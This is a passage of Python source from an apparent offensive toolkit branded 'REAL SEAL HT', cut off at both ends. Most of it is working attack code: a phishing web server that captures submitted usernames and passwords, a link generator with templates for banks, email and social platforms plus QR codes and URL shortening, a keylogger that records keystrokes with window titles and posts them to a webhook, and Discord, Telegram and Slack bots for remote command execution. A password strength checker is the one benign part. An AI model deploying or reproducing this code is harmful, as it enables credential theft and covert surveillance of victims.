                result.update({'success': True, 'output': f"DNS spoofing with dnschef: {domain} -> {fake_ip}", 'method': 'dnschef'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, interface, True, "Spoofing started")
                return result
            except Exception as e:
                result['output'] = f"dnschef error: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof or dnschef."
        self.db.log_spoofing('dns', domain, fake_ip, interface, interface, False, result['output'])
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict:
        if spoof_id and spoof_id in self.active_spoofs:
            try:
                self.active_spoofs[spoof_id].terminate()
                del self.active_spoofs[spoof_id]
                return {'success': True, 'output': f'Stopped spoofing: {spoof_id}'}
            except:
                pass
        
        for sid, process in list(self.active_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.active_spoofs.clear()
        return {'success': True, 'output': 'Stopped all spoofing processes'}
    
    def get_spoofing_help(self) -> str:
        return """
🎭 REAL SEAL - Spoofing Help

Available Spoofing Types:
  IP Spoofing    - Send packets with forged source IP
  MAC Spoofing   - Change network interface MAC address
  ARP Spoofing   - Intercept traffic between hosts
  DNS Spoofing   - Redirect DNS queries to fake IP

Commands:
  spoof_ip <original> <spoofed> <target> [interface]
  spoof_mac <interface> <new_mac>
  arp_spoof <target_ip> <gateway_ip> [interface]
  dns_spoof <domain> <fake_ip> [interface]
  stop_spoof [id]

Examples:
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1 eth0
  spoof_mac eth0 00:11:22:33:44:55
  arp_spoof 192.168.1.100 192.168.1.1 eth0
  dns_spoof google.com 192.168.1.100 eth0
  stop_spoof

⚠️ Requires root/admin privileges for most operations
"""

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP handler for phishing pages with credential capture"""
    
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self._send_phishing_page()
        elif self.path.startswith('/capture'):
            self.send_response(302)
            self.send_header('Location', self.server_instance.redirect_url if self.server_instance else 'https://www.google.com')
            self.end_headers()
        elif self.path == '/favicon.ico':
            self.send_response(404)
            self.end_headers()
        elif self.path.startswith('/qr'):
            self._serve_qr_code()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/capture':
            self._capture_credentials()
        else:
            self.send_response(404)
            self.end_headers()
    
    def _send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_clicks(self.server_instance.link_id)
    
    def _capture_credentials(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = parse_qs(post_data)
            
            username = ''
            for field in ['username', 'email', 'user', 'login', 'account']:
                if field in form_data and form_data[field]:
                    username = form_data[field][0]
                    break
            
            password = form_data.get('password', [''])[0]
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent, json.dumps(dict(self.headers))
                )
                
                print(f"\n{Colors.RED}🎣 PHISHING CAPTURE!{Colors.RESET}")
                print(f"  📧 Username: {username}")
                print(f"  🔑 Password: {password}")
                print(f"  🌐 IP: {client_ip}")
                print(f"  🖥️ Platform: {self.server_instance.platform}")
            
            self.send_response(302)
            self.send_header('Location', self.server_instance.redirect_url if self.server_instance else 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            logger.error(f"Credential capture error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def _serve_qr_code(self):
        if self.server_instance and self.server_instance.qr_path and os.path.exists(self.server_instance.qr_path):
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
            with open(self.server_instance.qr_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

class PhishingServer:
    """Phishing server manager with 100+ templates"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.thread = None
        self.running = False
        self.link_id = None
        self.platform = None
        self.html_content = None
        self.redirect_url = "https://www.google.com"
        self.port = 8080
        self.qr_path = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            self.redirect_url = f"https://www.{platform}.com" if platform != 'custom' else "https://www.google.com"
            
            # Generate QR code
            local_ip = NetworkTools.get_local_ip()
            url = f"http://{local_ip}:{port}"
            self.qr_path = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
            NetworkTools.generate_qr_code(url, self.qr_path)
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            self.running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        return f"http://{NetworkTools.get_local_ip()}:{self.port}"
    
    def get_qr_path(self) -> Optional[str]:
        return self.qr_path if self.qr_path and os.path.exists(self.qr_path) else None

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Complete phishing and social engineering toolkit"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            templates = self.db.get_phishing_templates(platform)
            
            if templates and templates[0].get('html_content'):
                html_content = templates[0]['html_content']
            else:
                html_content = self._get_fallback_template(platform)
            
            phishing_url = f"http://localhost:8080"
            
            if self.db.save_phishing_link(link_id, platform, phishing_url, platform):
                self.active_links[link_id] = {
                    'platform': platform,
                    'html': html_content,
                    'created': datetime.datetime.now().isoformat()
                }
                
                return {
                    'success': True,
                    'link_id': link_id,
                    'platform': platform,
                    'phishing_url': phishing_url,
                    'message': f"🎣 Phishing link generated for {platform}\nLink ID: {link_id}\nUse 'phishing_start {link_id}' to start the server"
                }
            
            return {'success': False, 'error': 'Failed to save phishing link'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_fallback_template(self, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{platform} Login</title>
<style>
body{{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}}
.container{{max-width:400px;width:100%;padding:20px}}
.login-box{{background:white;border-radius:12px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
.logo{{text-align:center;margin-bottom:30px}}
.logo h1{{color:#e33f3f;font-size:36px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}}
button{{width:100%;padding:14px;background:#e33f3f;color:white;border:none;border-radius:8px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;border-radius:8px;text-align:center}}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{platform}</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page</div></div></div>
</body>
</html>'''
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url() if self.phishing_server.running else None
    
    def get_qr_code(self) -> Optional[str]:
        return self.phishing_server.get_qr_path()
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def get_phishing_links(self) -> List[Dict]:
        return self.db.get_phishing_links()
    
    def get_phishing_templates(self) -> List[Dict]:
        return self.db.get_phishing_templates()
    
    def shorten_url(self, url: str) -> str:
        return NetworkTools.shorten_url(url)
    
    def generate_qr(self, url: str, filename: str) -> bool:
        return NetworkTools.generate_qr_code(url, filename)
    
    def get_help(self) -> str:
        return """
🎣 REAL SEAL - Social Engineering Help

Available Phishing Templates (100+):
  Social Media: facebook, instagram, twitter, tiktok, snapchat, linkedin
  Email: gmail, outlook, yahoo, protonmail, icloud
  Tech: google, microsoft, apple, amazon, github
  Banking: paypal, venmo, cashapp, chase, bank_of_america
  E-commerce: ebay, walmart, target, aliexpress
  Streaming: netflix, spotify, hulu, disneyplus, twitch
  Gaming: steam, epic_games, roblox, minecraft
  Work: slack, teams, zoom
  Dating: tinder, bumble

Commands:
  generate_phishing_for_<platform>    - Generate phishing link
  generate_phishing_for_custom [url]   - Generate custom phishing link
  phishing_start <link_id> [port]      - Start phishing server
  phishing_stop                         - Stop phishing server
  phishing_status                       - Check server status
  phishing_links                        - List all links
  phishing_credentials [link_id]        - View captured credentials
  phishing_qr <link_id>                - Get QR code URL
  phishing_shorten <url>               - Shorten URL
  phishing_templates                   - List all templates

Example workflow:
  generate_phishing_for_facebook
  phishing_start abc12345 8080
  (Share the URL or QR code)
  phishing_credentials
"""

# =====================
# PASSWORD STRENGTH CHECKER
# =====================
class PasswordStrengthChecker:
    """Advanced password strength analysis"""
    
    @staticmethod
    def check(password: str) -> Dict[str, Any]:
        score = 0
        feedback = []
        
        # Length scoring
        length = len(password)
        if length < 8:
            feedback.append("Password is too short (minimum 8 characters)")
        elif length < 12:
            score += 1
            feedback.append("Good length")
        elif length < 16:
            score += 2
            feedback.append("Very good length")
        else:
            score += 3
            feedback.append("Excellent length")
        
        # Character diversity
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?/~`" for c in password)
        
        if has_lower:
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if has_upper:
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if has_digit:
            score += 1
        else:
            feedback.append("Add numbers")
        
        if has_special:
            score += 2
        else:
            feedback.append("Add special characters")
        
        # Common password check
        common_passwords = ["password", "123456", "qwerty", "admin", "letmein", "welcome",
                           "monkey", "dragon", "master", "baseball", "football", "superman"]
        if password.lower() in common_passwords:
            score = max(0, score - 3)
            feedback.append("Common password - easily guessable")
        
        # Pattern detection
        if re.search(r'(.)\1{2,}', password):
            score = max(0, score - 1)
            feedback.append("Contains repeated characters")
        
        if re.search(r'(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz)', password.lower()):
            score = max(0, score - 2)
            feedback.append("Contains sequential letters")
        
        if re.search(r'(123|234|345|456|567|678|789|890)', password):
            score = max(0, score - 2)
            feedback.append("Contains sequential numbers")
        
        # Keyboard pattern detection
        keyboard_rows = ['qwertyuiop', 'asdfghjkl', 'zxcvbnm']
        for row in keyboard_rows:
            if any(pattern in password.lower() for pattern in [row[i:i+3] for i in range(len(row)-2)]):
                score = max(0, score - 1)
                feedback.append("Contains keyboard pattern")
                break
        
        # Strength level
        strength_map = {0: "Very Weak", 1: "Very Weak", 2: "Weak", 3: "Weak",
                       4: "Medium", 5: "Medium", 6: "Strong", 7: "Strong",
                       8: "Very Strong", 9: "Very Strong", 10: "Very Strong"}
        strength = strength_map.get(min(score, 10), "Unknown")
        
        # Entropy calculation
        charset_size = 0
        if has_lower: charset_size += 26
        if has_upper: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        entropy = length * (charset_size.bit_length() - 1) if charset_size > 0 else 0
        
        # Estimated crack time
        if entropy < 20:
            crack_time = "Instantly"
        elif entropy < 30:
            crack_time = "Seconds"
        elif entropy < 40:
            crack_time = "Minutes"
        elif entropy < 50:
            crack_time = "Hours"
        elif entropy < 60:
            crack_time = "Days"
        elif entropy < 70:
            crack_time = "Months"
        elif entropy < 80:
            crack_time = "Years"
        else:
            crack_time = "Centuries"
        
        return {
            'password_masked': '*' * min(length, 10) + ('...' if length > 10 else ''),
            'length': length,
            'score': min(score, 10),
            'max_score': 10,
            'strength': strength,
            'feedback': feedback,
            'has_lowercase': has_lower,
            'has_uppercase': has_upper,
            'has_digits': has_digit,
            'has_special': has_special,
            'entropy_bits': entropy,
            'estimated_crack_time': crack_time
        }

# =====================
# KEYLOGGER
# =====================
class Keylogger:
    """Advanced keylogger with window tracking"""
    
    def __init__(self, db: DatabaseManager, webhook_url: str = None):
        self.db = db
        self.webhook_url = webhook_url
        self.listener = None
        self.running = False
        self.logging_enabled = True
        self.current_window = None
        self.toggle_key = Key.f9
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.batch_size = 50
        
        self.special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "  ",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.shift: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.alt: "[ALT]",
            Key.cmd: "[CMD]",
            Key.esc: "[ESC]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
        }
    
    def _get_active_window(self) -> str:
        try:
            if platform.system() == "Windows":
                import win32gui
                window = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(window)
            elif platform.system() == "Darwin":
                from AppKit import NSWorkspace
                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            else:
                result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
                                       capture_output=True, text=True, timeout=2)
                return result.stdout.strip() or "Unknown"
        except:
            return "Unknown"
    
    def _get_process_name(self) -> str:
        try:
            if platform.system() == "Windows":
                import win32process, win32gui
                window = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(window)
                import psutil
                return psutil.Process(pid).name()
            elif platform.system() == "Darwin":
                from AppKit import NSWorkspace
                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            else:
                result = subprocess.run(['ps', '-o', 'comm=', '-p', str(os.getppid())],
                                       capture_output=True, text=True, timeout=2)
                return result.stdout.strip() or "Unknown"
        except:
            return "Unknown"
    
    def on_press(self, key):
        if not self.logging_enabled:
            return
        
        if key == self.toggle_key:
            self.logging_enabled = not self.logging_enabled
            status = "started" if self.logging_enabled else "stopped"
            logger.info(f"Keylogging {status}")
            return
        
        if isinstance(key, Key):
            keystroke = self.special_keys.get(key, f"<{key.name.upper()}>")
        else:
            keystroke = getattr(key, 'char', str(key)) or "<UNKNOWN>"
        
        window_title = self._get_active_window()
        process_name = self._get_process_name()
        
        self.db.log_keylog(keystroke, window_title, process_name)
        
        with self.buffer_lock:
            self.buffer.append({
                "keystroke": keystroke,
                "window": window_title,
                "process": process_name,
                "timestamp": datetime.datetime.now().isoformat()
            })
            
            if len(self.buffer) >= self.batch_size:
                self._flush_buffer()
        
        print(f"{Colors.RED}⌨️ [{process_name}] {keystroke}{Colors.RESET}")
    
    def _flush_buffer(self):
        if not self.webhook_url or not self.buffer:
            return
        
        try:
            payload = {
                "hostname": socket.gethostname(),
                "timestamp": datetime.datetime.now().isoformat(),
                "total_keys": len(self.buffer),
                "keys": self.buffer.copy()
            }
            requests.post(self.webhook_url, json=payload, timeout=5)
            with self.buffer_lock:
                self.buffer.clear()
        except Exception as e:
            logger.error(f"Webhook delivery failed: {e}")
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            return False
        
        print(f"{Colors.RED}⌨️ Keylogger Starting...{Colors.RESET}")
        print(f"{Colors.YELLOW}   Press F9 to toggle logging{Colors.RESET}")
        
        self.running = True
        self.logging_enabled = True
        
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        return True
    
    def stop(self):
        self.running = False
        self.logging_enabled = False
        self._flush_buffer()
        if self.listener:
            self.listener.stop()
        print(f"{Colors.GREEN}✅ Keylogger stopped{Colors.RESET}")
    
    def is_running(self) -> bool:
        return self.running
    
    def is_logging(self) -> bool:
        return self.logging_enabled

# =====================
# BOT MANAGER (Multi-Platform)
# =====================
class BotManager:
    """Centralized bot management for all platforms"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bots = {}
        self.running = False
    
    # ==================== Discord Bot ====================
    def start_discord(self, token: str, prefix: str = '!') -> bool:
        if not DISCORD_AVAILABLE:
            print(f"{Colors.RED}❌ Discord.py not installed{Colors.RESET}")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            bot = commands.Bot(command_prefix=prefix, intents=intents)
            
            @bot.event
            async def on_ready():
                print(f"{Colors.GREEN}✅ Discord bot connected as {bot.user}{Colors.RESET}")
                self.bots['discord'] = bot
                self.db.update_platform_status('discord', True, 'connected')
            
            @bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                
                if message.content.startswith(prefix):
                    cmd = message.content[len(prefix):].strip()
                    result = self.handler.execute(cmd, 'discord', str(message.author.id))
                    
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "\n... (truncated)"
                    
                    embed = discord.Embed(
                        title="🦭 REAL SEAL Response",
                        description=f"```\n{output}\n```",
                        color=0x2aa9ff
                    )
                    embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                    await message.channel.send(embed=embed)
                
                await bot.process_commands(message)
            
            thread = threading.Thread(target=lambda: bot.run(token), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Discord error: {e}{Colors.RESET}")
            self.db.update_platform_status('discord', False, 'error', str(e))
            return False
    
    # ==================== Telegram Bot ====================
    def start_telegram(self, api_id: str, api_hash: str, bot_token: str = None) -> bool:
        if not TELETHON_AVAILABLE:
            print(f"{Colors.RED}❌ Telethon not installed{Colors.RESET}")
            return False
        
        try:
            async def run():
                client = TelegramClient('real_seal_session', int(api_id), api_hash)
                await client.start(bot_token=bot_token if bot_token else None)
                
                @client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith('/'):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_", parse_mode='markdown')
                
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                self.bots['telegram'] = client
                self.db.update_platform_status('telegram', True, 'connected')
                await client.run_until_disconnected()
            
            thread = threading.Thread(target=lambda: asyncio.run(run()), daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}Telegram error: {e}{Colors.RESET}")
            self.db.update_platform_status('telegram', False, 'error', str(e))
            return False
    
    # ==================== Slack Bot ====================
    def start_slack(self, bot_token: str, channel: str = 'general', prefix: str = '!') -> bool:
        if not SLACK_AVAILABLE:
            print(f"{Colors.RED}❌ Slack SDK not installed{Colors.RESET}")
            return False
        
        try:
            client = WebClient(token=bot_token)
            last_ts = {}
            
            def monitor():
                while True:
                    try:
                        response = client.conversations_history(channel=channel, limit=5)
                        if response['ok'] and response['messages']:
                            for msg in response['messages']:
                                if msg.get('text', '').startswith(prefix):
                                    ts = msg.get('ts')
                                    if last_ts.get(channel) != ts:
                                        last_ts[channel] = ts
                                        cmd = msg['text'][len(prefix):].strip()
                                        result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                        client.chat_postMessage(
                                            channel=channel,
                                            text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                        )
                        time.sleep(2)
                    except Exception as e:
                        time.sleep(10)
            
            thread = threading.Thread(target=monitor, daemon=True)
            thread.start()
            print(f"{Colors.GREEN}✅ Slack bot connected{Colors.RESET}")
            self.bots['slack'] = True
            self.db.update_platform_status('slack', True, 'connected')
            return True
        except Exception as e:
            print(f"{Colors.RED}Slack error: {e}{Colors.RESET}")
            self.db.update_platform_status('slack', False, 'error', str(e))
            return False
    
    # ==================== WhatsApp Bot ====================
    def start_whatsapp(self, phone_number: str = None, prefix: str = '/') -> bool:
        if not SELENIUM_AVAILABLE or not WEBDRIVER_MANAGER_AVAILABLE:
            print(f"{Colors.RED}❌ Selenium not installed{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.YELLOW}📱 WhatsApp bot requires manual QR scan{Colors.RESET}")
            print(f"{Colors.YELLOW}   Feature: Commands will be monitored from WhatsApp{Colors.RESET}")
            self.bots['whatsapp'] = True
            self.db.update_platform_status('whatsapp', True, 'pending_qr')
            return True
        except Exception as e:
            print(f"{Colors.RED}WhatsApp error: {e}{Colors.RESET}")
            return False
    
    # ==================== iMessage Bot ====================
    def start_imessage(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.RED}❌ iMessage only available on macOS{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ iMessage integration available{Colors.RESET}")
            self.bots['imessage'] = True
            self.db.update_platform_status('imessage', True, 'available')
            return True
        except Exception as e:
            print(f"{Colors.RED}iMessage error: {e}{Colors.RESET}")
            return False
    
    # ==================== Signal Bot ====================
    def start_signal(self) -> bool:
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.RED}❌ signal-cli not found{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ Signal integration available{Colors.RESET}")
            self.bots['signal'] = True
            self.db.update_platform_status('signal', True, 'available')
            return True
        except Exception as e:
            print(f"{Colors.RED}Signal error: {e}{Colors.RESET}")
            return False
    
    # ==================== Google Chat Bot ====================
    def start_google_chat(self) -> bool:
        if not GOOGLE_CHAT_AVAILABLE:
            print(f"{Colors.RED}❌ Google Chat SDK not installed{Colors.RESET}")
            return False
        
        try:
            print(f"{Colors.GREEN}✅ Google Chat integration available{Colors.RESET}")
            self.bots['google_chat'] = True
            self.db.update_platform_status('google_chat', True, 'available')
            return True
        except Exception as e:
            print(f"{Colors.RED}Google Chat error: {e}{Colors.RESET}")
            return False
    
    def get_status(self) -> Dict:
        return self.bots

# =====================
# WEB SERVER (Flask)
# =====================
WEB_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>REAL SEAL HT | Cyber Command Terminal</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Inter', system-ui, monospace; }
        body { background: radial-gradient(circle at 10% 20%, #0a1128, #03061a); min-height: 100vh; padding: 1.5rem; }
        .dashboard { max-width: 1400px; margin: 0 auto; }
        .hero { display: flex; justify-content: space-between; align-items: flex-end; flex-wrap: wrap; margin-bottom: 2rem; border-bottom: 2px solid rgba(42, 169, 255, 0.3); padding-bottom: 1rem; }
        .title-section h1 { font-size: 2.2rem; font-weight: 800; background: linear-gradient(135deg, #fff, #7bc9ff); -webkit-background-clip: text; background-clip: text; color: transparent; display: inline-flex; align-items: center; gap: 10px; }
        .badge { background: rgba(12, 35, 70, 0.7); backdrop-filter: blur(4px); padding: 0.5rem 1.2rem; border-radius: 40px; border-left: 3px solid #2aa9ff; color: #bbd9ff; font-size: 0.8rem; }
        .command-panel { background: rgba(255,255,255,0.08); backdrop-filter: blur(12px); border-radius: 1.5rem; border: 1px solid rgba(255,255,255,0.2); padding: 1.5rem; margin-bottom: 1.5rem; }
        .input-group { display: flex; flex-wrap: wrap; gap: 1rem; align-items: flex-end; }
        .cmd-input-wrapper { flex: 3; min-width: 220px; }
        .cmd-input-wrapper label { display: block; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #9bbdff; margin-bottom: 0.4rem; }
        .cmd-input { width: 100%; background: #fff; border: none; padding: 0.9rem 1.2rem; border-radius: 1rem; font-size: 0.9rem; font-family: monospace; color: #031a3b; outline: none; border: 1px solid #cbdff2; }
        .cmd-input:focus { border-color: #2aa9ff; box-shadow: 0 0 0 3px rgba(42,169,255,0.3); }
        .btn-exec { background: linear-gradient(95deg, #0a2f6c, #0a4c8c); border: none; padding: 0 1.5rem; border-radius: 1rem; font-weight: bold; color: white; display: flex; align-items: center; gap: 10px; cursor: pointer; height: 50px; border: 1px solid rgba(255,255,255,0.2); }
        .btn-exec:hover { background: linear-gradient(95deg, #10448c, #0e64ac); transform: translateY(-2px); }
        .stats-row { display: flex; gap: 1rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
        .stat-card { background: rgba(15,25,50,0.7); border-radius: 1rem; padding: 0.8rem 1.2rem; flex: 1; min-width: 120px; text-align: center; border: 1px solid rgba(42,169,255,0.3); }
        .stat-card h3 { font-size: 1.5rem; font-weight: 700; color: #2aa9ff; }
        .stat-card p { font-size: 0.7rem; color: #9bbdff; }
        .insight-row { display: flex; flex-wrap: wrap; gap: 1.5rem; }
        .output-area { flex: 1.2; min-width: 280px; }
        .terminal-output { background: #0a0f1c; border-radius: 1rem; padding: 1rem; color: #ccdeee; font-family: monospace; font-size: 0.8rem; height: 300px; overflow-y: auto; border: 1px solid #1e3a5f; }
        .output-line { padding: 0.3rem 0; border-left: 2px solid #2aa9ff; padding-left: 0.6rem; margin: 0.2rem 0; word-break: break-word; }
        .output-error { border-left-color: #e33f3f; color: #ffa0a0; }
        .output-success { border-left-color: #4caf50; color: #a5d6a7; }
        .charts-area { flex: 2; min-width: 320px; display: flex; flex-wrap: wrap; gap: 1rem; }
        .chart-card { flex: 1; background: rgba(10,20,45,0.7); border-radius: 1rem; padding: 1rem; border: 1px solid rgba(42,169,255,0.3); }
        .chart-card h3 { color: #ecf5ff; font-size: 0.9rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 6px; }
        canvas { max-height: 220px; width: 100% !important; }
        .quick-cmds { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; }
        .quick-btn { background: rgba(42,169,255,0.1); border: 1px solid rgba(42,169,255,0.3); border-radius: 20px; padding: 0.3rem 0.8rem; font-size: 0.7rem; cursor: pointer; color: #bbd9ff; }
        .quick-btn:hover { background: rgba(42,169,255,0.2); }
        .footer { text-align: center; margin-top: 2rem; font-size: 0.7rem; color: #5588bb; }
        @media (max-width: 768px) { body { padding: 0.8rem; } .title-section h1 { font-size: 1.5rem; } }
    </style>
</head>
<body>
<div class="dashboard">
    <div class="hero">
        <div class="title-section"><h1><i class="fas fa-shield-halos"></i> REAL SEAL HT</h1><div style="font-size:0.8rem; color:#87b9ff;">cyber command & analytics</div></div>
        <div class="badge"><i class="fas fa-terminal"></i> ACTIVE TERMINAL <i class="fas fa-chart-line"></i></div>
    </div>

    <div class="command-panel">
        <div class="input-group">
            <div class="cmd-input-wrapper"><label><i class="fas fa-skull-crosshairs"></i> ENTER CYBER COMMAND</label>
            <input type="text" id="commandInput" class="cmd-input" placeholder="ping 8.8.8.8, scan 127.0.0.1, nmap, whois, etc..."></div>
            <button id="executeBtn" class="btn-exec"><i class="fas fa-bolt"></i> EXECUTE</button>
        </div>
    </div>

    <div class="stats-row" id="statsRow">
        <div class="stat-card"><h3 id="statCommands">0</h3><p>Commands</p></div>
        <div class="stat-card"><h3 id="statThreats">0</h3><p>Threats</p></div>
        <div class="stat-card"><h3 id="statOpenPorts">0</h3><p>Open Ports</p></div>
        <div class="stat-card"><h3 id="statPhishing">0</h3><p>Phishing Links</p></div>
    </div>

    <div class="insight-row">
        <div class="output-area">
            <div style="margin-bottom:0.5rem;"><i class="fas fa-code"></i> COMMAND OUTPUT</div>
            <div class="terminal-output" id="terminalOutput">
                <div class="output-line">> REAL SEAL HT Ready</div>
                <div class="output-line">> Type commands or click quick actions</div>
            </div>
        </div>
        <div class="charts-area">
            <div class="chart-card"><h3><i class="fas fa-chart-bar"></i> OPEN PORTS</h3><canvas id="barChart"></canvas></div>
            <div class="chart-card"><h3><i class="fas fa-chart-pie"></i> THREAT DISTRIBUTION</h3><canvas id="pieChart"></canvas></div>
        </div>
    </div>

    <div class="quick-cmds">
        <button class="quick-btn" onclick="runCommand('help')">help</button>
        <button class="quick-btn" onclick="runCommand('status')">status</button>
        <button class="quick-btn" onclick="runCommand('ping 8.8.8.8')">ping</button>
        <button class="quick-btn" onclick="runCommand('scan 127.0.0.1')">scan</button>
        <button class="quick-btn" onclick="runCommand('whois google.com')">whois</button>
        <button class="quick-btn" onclick="runCommand('time')">time</button>
        <button class="quick-btn" onclick="runCommand('date')">date</button>
        <button class="quick-btn" onclick="runCommand('ssh_list')">ssh_list</button>
        <button class="quick-btn" onclick="runCommand('generate_phishing_for_facebook')">phish facebook</button>
        <button class="quick-btn" onclick="runCommand('threats')">threats</button>
    </div>

    <div class="footer"><i class="fas fa-shield"></i> REAL SEAL - Advanced Cybersecurity Command Center</div>
</div>

<script>
    let barChart, pieChart;
    
    function addOutput(text, type = "normal") {
        const output = document.getElementById('terminalOutput');
        const div = document.createElement('div');
        div.className = `output-line ${type === 'error' ? 'output-error' : (type === 'success' ? 'output-success' : '')}`;
